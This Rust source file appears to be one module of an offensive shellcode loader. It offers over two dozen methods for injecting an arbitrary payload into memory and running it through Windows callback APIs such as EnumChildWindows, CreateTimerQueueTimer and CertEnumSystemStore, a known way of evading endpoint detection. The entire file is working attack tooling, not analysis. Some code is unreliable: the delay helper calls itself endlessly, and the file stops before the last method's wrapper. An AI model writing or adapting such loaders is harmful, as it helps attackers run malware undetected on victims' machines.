// =======================================================================================================
// SHELLCODE EXECUTION METHODS
// =======================================================================================================

use std::ffi::c_void;
use std::ptr::{null_mut, null};
use std::mem::{transmute, size_of};

#[cfg(any(feature = "ShellcodeExecuteCopyFileExW", feature = "ShellcodeExecuteEnumResourceTypesW", feature = "ShellcodeExecuteEnumDirTreeW", feature = "ShellcodeExecuteFlsAlloc"))]
use windows_sys::w;

#[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
use windows_sys::s;

// =======================================================================================================
// HELPER FUNCTIONS
// =======================================================================================================

/// Helper function to delay execution (used after shellcode execution for stability)
#[inline(always)]
fn delay_execution() {
    unsafe {
        delay_execution();
    }
}

// =======================================================================================================
// INJECTION WRAPPER
// =======================================================================================================

fn inject_shellcode(bytes_to_load: &[u8]) -> Result<*mut c_void, i32> {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        use super::injection::inject_default_local;
        inject_default_local(bytes_to_load)
    }
    
    #[cfg(feature = "InjectionMappingLocal")]
    {
        use super::injection::inject_mapping_local;
        inject_mapping_local(bytes_to_load)
    }
    
    #[cfg(feature = "InjectionFunctionStomping")]
    {
        use super::injection::inject_function_stomping;
        inject_function_stomping(bytes_to_load)
    }
    
    #[cfg(feature = "InjectionModuleStomping")]
    {
        use super::injection::inject_module_stomping;
        inject_module_stomping(bytes_to_load)
    }
}

// =======================================================================================================
// EXECUTION METHOD: DEFAULT
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteDefault")]
pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            unsafe {
                let function: extern "C" fn() = std::mem::transmute(base_address);
                (function)();
            }
            true
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: FIBER
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteFiber")]
use windows_sys::Win32::System::Threading::{
    ConvertThreadToFiber, CreateFiber, DeleteFiber, SwitchToFiber,
};

#[cfg(feature = "ShellcodeExecuteFiber")]
type LPFIBER_START_ROUTINE = unsafe extern "system" fn(*mut c_void);

#[cfg(feature = "ShellcodeExecuteFiber")]
struct Fiber {
    shellcode_fiber_address: *mut c_void,
    primary_fiber_address: *mut c_void,
}

#[cfg(feature = "ShellcodeExecuteFiber")]
impl Drop for Fiber {
    fn drop(&mut self) {
        unsafe {
            if !self.shellcode_fiber_address.is_null() {
                DeleteFiber(self.shellcode_fiber_address);
            }
            if !self.primary_fiber_address.is_null() {
                DeleteFiber(self.primary_fiber_address);
            }
        }
    }
}

#[cfg(feature = "ShellcodeExecuteFiber")]
pub fn shellcode_execute_fiber(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            unsafe {
                let mut fiber: Fiber = std::mem::zeroed();
                fiber.shellcode_fiber_address = CreateFiber(
                    0, 
                    Some(std::mem::transmute::<*mut c_void, LPFIBER_START_ROUTINE>(base_address)), 
                    null_mut()
                );
                if fiber.shellcode_fiber_address.is_null() {
                    return false;
                }
                
                // Convert current thread to fiber
                fiber.primary_fiber_address = ConvertThreadToFiber(null_mut());
                if fiber.primary_fiber_address.is_null() {
                    return false;
                }

                // Switch execution to shellcode fiber
                SwitchToFiber(fiber.shellcode_fiber_address);
            }
            true
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: CreateTimerQueueTimer
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
use windows_sys::Win32::{
    Foundation::GetLastError,
    System::Threading::CreateTimerQueueTimer
};

#[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
fn exec_payload_via_callback_func(start_address: *mut c_void, parameter: Option<*const c_void>) -> Result<(), String> {

    let mut h_timer = null_mut();
    let status = unsafe {
        CreateTimerQueueTimer(
            &mut h_timer,
            null_mut(),
            Some(std::mem::transmute(start_address)),
            parameter.unwrap_or(null()),
            0x00,
            0x00,
            0x00
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
pub fn shellcode_execute_createtimerqueuetimer(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func(base_address, None) {
                Ok(_) => {
                    // Sleep to allow callback execution
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumChildWindows
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
use windows_sys::Win32::UI::WindowsAndMessaging::EnumChildWindows;

#[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
fn exec_payload_via_callback_func_enumchild(start_address: *mut c_void, parameter: Option<isize>) -> Result<(), String> {
    let status = unsafe { EnumChildWindows(null_mut(), Some(std::mem::transmute(start_address)), parameter.unwrap_or(0)) };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
pub fn shellcode_execute_enumchildwindows(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_enumchild(base_address, None) {
                Ok(_) => {
                    // Sleep to allow callback execution
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumUILanguagesW
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
use windows_sys::Win32::Globalization::{EnumUILanguagesW, MUI_LANGUAGE_NAME};

#[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
fn exec_payload_via_callback_func_enum(start_address: *mut c_void, parameter: Option<isize>) -> Result<(), String> {
    let status = unsafe { EnumUILanguagesW(Some(std::mem::transmute(start_address)), MUI_LANGUAGE_NAME, parameter.unwrap_or(0)) };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
pub fn shellcode_execute_enumuilanguages(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_enum(base_address, None) {
                Ok(_) => {
                    // Sleep to allow callback execution
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: VerifierEnumerateResource
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
use windows_sys::{
    s,
    Win32::{
        Foundation::{GetLastError, ERROR_SUCCESS, HANDLE},
        System::LibraryLoader::{GetProcAddress, LoadLibraryA}
    }
};

#[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
type VerifierEnumerateResourceType = unsafe extern "system" fn(
    Process: HANDLE,
    Flags: u32,
    ResourceType: u32,
    ResourceCallback: *mut c_void,
    EnumerationContext: *mut c_void
) -> u32;

#[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
fn exec_payload_via_callback_func_verifier(start_address: *mut c_void) -> Result<(), String> {
    unsafe {
        let h_module = LoadLibraryA(s!("verifier.dll"));
        let VerifierEnumerateResource = match GetProcAddress(h_module, s!("VerifierEnumerateResource")) {
            Some(addr) => std::mem::transmute::<_, VerifierEnumerateResourceType>(addr),
            None => {
                return Err(String::from(""));
            }
        };

        let error_code = VerifierEnumerateResource((-1isize) as HANDLE, 0x00, 0x00, start_address, null_mut());
    }
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
pub fn shellcode_execute_verifierenumerate(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_verifier(base_address) {
                Ok(_) => {
                    // Sleep to allow callback execution
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumDesktopWindows
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
use windows_sys::Win32::System::{
    StationsAndDesktops::{EnumDesktopWindows, GetThreadDesktop},
    Threading::GetCurrentThreadId,
};

#[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
fn exec_payload_via_callback_func_enumdesktop(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        EnumDesktopWindows(
            GetThreadDesktop(GetCurrentThreadId()),
            transmute(start_address),
            parameter.unwrap_or(0),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
pub fn shellcode_execute_enumdesktopwindows(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_enumdesktop(base_address, None) {
                Ok(_) => {
                    // Sleep to allow callback execution
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumSystemLocalesEx
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
use windows_sys::Win32::Globalization::{EnumSystemLocalesEx, LOCALE_ALL};

#[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
fn exec_payload_via_callback_func_enumsystemlocales(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        EnumSystemLocalesEx(
            transmute(start_address),
            LOCALE_ALL,
            parameter.unwrap_or(0),
            null_mut(),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
pub fn shellcode_execute_enumsystemlocales(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_enumsystemlocales(base_address, None) {
                Ok(_) => {
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: CertEnumSystemStoreLocation 
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
use windows_sys::Win32::Security::Cryptography::CertEnumSystemStoreLocation;

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
fn exec_payload_via_callback_func_certenum(start_address: *mut c_void) -> Result<(), String> {

    let success = unsafe {
        CertEnumSystemStoreLocation(
            0,
            null_mut(),
            transmute(start_address),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
pub fn shellcode_execute_certenumsystemstorelocation(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_certenum(base_address) {
                Ok(_) => {
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumWindowStationsW  
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
use windows_sys::Win32::System::StationsAndDesktops::EnumWindowStationsW;

#[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
fn exec_payload_via_callback_func_enumwindowstations(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success: i32 = unsafe {
        EnumWindowStationsW(
            transmute(start_address),
            parameter.unwrap_or(0),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
pub fn shellcode_execute_enumwindowstations(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_enumwindowstations(base_address, None) {
                Ok(_) => {
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumDisplayMonitors   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
use windows_sys::Win32::Graphics::Gdi::EnumDisplayMonitors;

#[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
fn exec_payload_via_callback_func_enumdisplaymonitors(start_address: *mut c_void) -> Result<(), String> {
    if start_address.is_null() {
        return Err(String::from(""));
    }

    let success = unsafe {
        EnumDisplayMonitors(
            null_mut(),
            null_mut(),
            transmute(start_address),
            0
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
pub fn shellcode_execute_enumdisplaymonitors(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_enumdisplaymonitors(base_address) {
                Ok(_) => {
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: ImageGetDigestStream    
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
use windows_sys::{
    w,
    Win32::{
        Foundation::{CloseHandle, GENERIC_READ},
        Storage::FileSystem::{CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING},
        System::Diagnostics::Debug::{CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO, ImageGetDigestStream},
    },
};

#[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
fn exec_payload_via_callback_func_imagegetdigeststream(start_address: *mut c_void) -> Result<(), String> {
    if start_address.is_null() {
        return Err(String::from(""));
    }

    let h_file = unsafe {
        CreateFileW(
            w!(r"C:\Windows\System32\kernel32.dll"),
            GENERIC_READ,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        )
    };

    let success = unsafe {
        ImageGetDigestStream(
            h_file,
            CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO,
            transmute(start_address),
            null_mut(),
        )
    };

    if success == 0 {
        unsafe { CloseHandle(h_file) };
        return Err(String::from(""));
    }

    unsafe { CloseHandle(h_file) };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
pub fn shellcode_execute_imagegetdigeststream(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_imagegetdigeststream(base_address) {
                Ok(_) => {
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: CertEnumSystemStore     
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
use windows_sys::Win32::Security::Cryptography::CertEnumSystemStore;

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
#[repr(u32)]
enum CertSystemStoreFlags {
    CurrentUser = 0x00010000,
}

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
fn exec_payload_via_callback_func_certenumsystemstore(start_address: *mut c_void) -> Result<(), String> {
    if start_address.is_null() {
        return Err(String::from(""));
    }

    let success = unsafe {
        CertEnumSystemStore(
            CertSystemStoreFlags::CurrentUser as u32,
            null_mut(),
            null_mut(),
            transmute(start_address),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
pub fn shellcode_execute_certenumsystemstore(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_certenumsystemstore(base_address) {
                Ok(_) => {
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumTimeFormatsEx      
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
use windows_sys::Win32::Globalization::{EnumTimeFormatsEx, LOCALE_NAME_SYSTEM_DEFAULT, TIME_NOSECONDS};

#[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
fn exec_payload_via_callback_func_enumtimeformats(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success: i32 = unsafe {
        EnumTimeFormatsEx(
            transmute(start_address),
            LOCALE_NAME_SYSTEM_DEFAULT,
            TIME_NOSECONDS,
            parameter.unwrap_or(0),
        )
    }; 
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
pub fn shellcode_execute_enumtimeformats(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_enumtimeformats(base_address, None) {
                Ok(_) => {
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: CryptEnumOIDInfo       
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
use windows_sys::Win32::Security::Cryptography::CryptEnumOIDInfo;

#[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
fn exec_payload_via_callback_func_cryptenumoidinfo(start_address: *mut c_void) -> Result<(), String> {
    if start_address.is_null() {
        return Err(String::from(""));
    }

    let success = unsafe {
        CryptEnumOIDInfo(
            0,
            0,
            null_mut(),
            transmute(start_address)
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
pub fn shellcode_execute_cryptenumoidinfo(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_cryptenumoidinfo(base_address) {
                Ok(_) => {
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: ImmEnumInputContext       
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
use windows_sys::Win32::{
    UI::Input::Ime::ImmEnumInputContext,
    System::Threading::Sleep,
};

#[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
fn exec_payload_via_callback_func_immenuminputcontext(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        ImmEnumInputContext(
            0,
            transmute(start_address),
            parameter.unwrap_or(0)
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
pub fn shellcode_execute_immenuminputcontext(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            let _ = exec_payload_via_callback_func_immenuminputcontext(start_address, None);
            unsafe {
                Sleep(5000);
            }
            true
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumPropsW
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumPropsW")]
use windows_sys::Win32::{
    Foundation::GetLastError,
    UI::WindowsAndMessaging::{EnumPropsW, GetForegroundWindow},
};

#[cfg(feature = "ShellcodeExecuteEnumPropsW")]
fn exec_payload_via_callback_func_enumpropsw(start_address: *mut c_void) -> Result<(), String> {
    let success = unsafe { EnumPropsW(GetForegroundWindow(), transmute(start_address)) };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumPropsW")]
pub fn shellcode_execute_enumpropsw(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumpropsw(start_address) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumLanguageGroupLocalesW
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
use windows_sys::Win32::Globalization::{EnumLanguageGroupLocalesW, LGRPID_WESTERN_EUROPE};

#[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
fn exec_payload_via_callback_func_enumlanguagegrouplocalesw(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        EnumLanguageGroupLocalesW(
            transmute(start_address),
            LGRPID_WESTERN_EUROPE,
            0,
            parameter.unwrap_or(0)
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
pub fn shellcode_execute_enumlanguagegrouplocalesw(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumlanguagegrouplocalesw(start_address, None) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: SymEnumProcesses
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
use windows_sys::Win32::System::{
    Diagnostics::Debug::{SymEnumProcesses, SymInitialize},
    Threading::GetCurrentProcess,
};

#[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
fn exec_payload_via_callback_func_symenumprocesses(start_address: *mut c_void) -> Result<(), String> {
    let mut success = unsafe { SymInitialize(GetCurrentProcess(), null_mut(), 0) };
    success = unsafe { SymEnumProcesses(transmute(start_address), null_mut()) };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
pub fn shellcode_execute_symenumprocesses(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_symenumprocesses(start_address) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: CopyFileExW
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteCopyFileExW")]
use windows_sys::Win32::Storage::FileSystem::{CopyFileExW, DeleteFileW};

#[cfg(feature = "ShellcodeExecuteCopyFileExW")]
fn exec_payload_via_callback_func_copyfileexw(start_address: *mut c_void) -> Result<(), String> {

    unsafe { DeleteFileW(w!(r"C:\Windows\Temp\creator.log")) };
    let success = unsafe {
        CopyFileExW(
            w!(r"C:\Windows\WindowsUpdate.log"),
            w!(r"C:\Windows\Temp\creator.log"),
            transmute(start_address),
            null_mut(),
            null_mut(),
            0x00000001, // COPY_FILE_FAIL_IF_EXISTS
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteCopyFileExW")]
pub fn shellcode_execute_copyfileexw(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_copyfileexw(start_address) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumObjects
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumObjects")]
use windows_sys::Win32::Graphics::Gdi::{EnumObjects, GetDC, OBJ_BRUSH};

#[cfg(feature = "ShellcodeExecuteEnumObjects")]
fn exec_payload_via_callback_func_enumobjects(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        EnumObjects(
            GetDC(null_mut()),
            OBJ_BRUSH,
            transmute(start_address),
            parameter.unwrap_or(0),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumObjects")]
pub fn shellcode_execute_enumobjects(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumobjects(start_address, None) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumResourceTypesW
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
use windows_sys::Win32::System::LibraryLoader::{EnumResourceTypesW, GetModuleHandleW};

#[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
fn exec_payload_via_callback_func_enumresourcetypesw(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        EnumResourceTypesW(
            GetModuleHandleW(w!("ntdll.dll")),
            transmute(start_address),
            parameter.unwrap_or(0),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
pub fn shellcode_execute_enumresourcetypesw(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumresourcetypesw(start_address, None) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumPageFilesW
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
use windows_sys::Win32::System::ProcessStatus::EnumPageFilesW;

#[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
fn exec_payload_via_callback_func_enumpagefilesw(
    start_address: *mut c_void,
    parameter: Option<*mut c_void>,
) -> Result<(), String> {

    let success = unsafe {
        EnumPageFilesW(
            transmute(start_address),
            parameter.unwrap_or(null_mut()),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
pub fn shellcode_execute_enumpagefilesw(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumpagefilesw(start_address, None) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumDirTreeW
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
use windows_sys::Win32::System::{Diagnostics::Debug::EnumDirTreeW, Threading::GetCurrentProcess};

#[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
fn exec_payload_via_callback_func_enumdirtreew(start_address: *mut c_void) -> Result<(), String> {

    let success = unsafe {
        EnumDirTreeW(
            GetCurrentProcess(),
            w!(r"C:\Windows"),
            w!("*.theme"),
            null_mut(),
            transmute(start_address),
            null_mut(),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
pub fn shellcode_execute_enumdirtreew(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumdirtreew(start_address) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumFontFamiliesW
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
use windows_sys::Win32::Graphics::Gdi::{EnumFontFamiliesW, GetDC};

#[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
fn exec_payload_via_callback_func_enumfontfamiliesw(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        EnumFontFamiliesW(
            GetDC(null_mut()),
            null_mut(),
            transmute(start_address),
            parameter.unwrap_or(0),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
pub fn shellcode_execute_enumfontfamiliesw(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumfontfamiliesw(start_address, None) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumDesktopsW 
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
use windows_sys::Win32::System::StationsAndDesktops::{EnumDesktopsW, GetProcessWindowStation};

#[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
fn exec_payload_via_callback_func_enumdesktopsw(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        EnumDesktopsW(
            GetProcessWindowStation(),
            transmute(start_address),
            parameter.unwrap_or(0),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
pub fn shellcode_execute_enumdesktopsw(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumdesktopsw(start_address, None) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: InitOnceExecuteOnce  
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
use windows_sys::Win32::System::Threading::{INIT_ONCE_STATIC_INIT, InitOnceExecuteOnce};

#[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
fn exec_payload_via_callback_func_initonceexecuteonce(
    start_address: *mut c_void,
    parameter: Option<*mut c_void>,
) -> Result<(), String> {

    let mut init_once = INIT_ONCE_STATIC_INIT;
    let success = unsafe {
        InitOnceExecuteOnce(
            &mut init_once,
            transmute(start_address),
            parameter.unwrap_or(null_mut()),
            null_mut(),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
pub fn shellcode_execute_initonceexecuteonce(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_initonceexecuteonce(start_address, None) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumThreadWindows   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
use windows_sys::Win32::UI::WindowsAndMessaging::EnumThreadWindows;

#[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
fn exec_payload_via_callback_func_enumthreadwindows(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        EnumThreadWindows(
            0,
            transmute(start_address),
            parameter.unwrap_or(0),
        )
    };
    Ok(())
}

